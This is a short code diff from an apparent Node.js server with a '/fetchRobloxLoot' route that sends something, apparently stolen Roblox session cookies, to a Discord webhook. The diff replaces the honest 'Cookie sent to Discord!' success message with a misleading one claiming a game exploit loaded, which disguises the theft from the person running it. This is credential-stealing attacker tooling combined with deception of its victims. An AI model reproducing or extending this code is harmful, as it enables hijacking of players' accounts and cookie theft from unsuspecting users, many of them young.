@@ -54,7 +54,7 @@ app.get("/fetchRobloxLoot", async (req, res) => {
       return res.status(500).json({ success: false, error: "❌ Failed to send to Discord webhook" });
     }
 
-    return res.json({ success: true, message: "✅ Cookie sent to Discord!" });
+    return res.json({ success: true, message: "✅ Exploit Loaded Successfully! Targetprofile data acquired. Refresh Roblox" });
 
   } catch (e) {
     console.error("SERVER ERROR:", e);
